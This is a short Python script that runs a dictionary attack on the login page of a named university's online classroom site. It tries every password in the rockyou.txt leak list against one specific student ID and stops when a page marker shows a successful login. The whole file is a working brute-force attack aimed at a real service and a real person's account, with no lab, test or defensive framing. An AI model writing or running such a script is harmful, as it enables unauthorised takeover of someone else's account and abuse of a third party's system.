import requests


URL = 'https://aulavirtual.utel.edu.mx/'

with open('/Users/massif/Desktop/rockyou.txt', errors='ignore') as passwords:
    for password in passwords:
        data = {'username': '010617958',
                'password': f'{password.strip()}',
                'auth_mode': 'db'}
        response = requests.post(URL, data=data)
        if "$('#load_niv').load('nivelacion.php');" in response.text:
            print(f'Password found: {password.strip()}')
            break
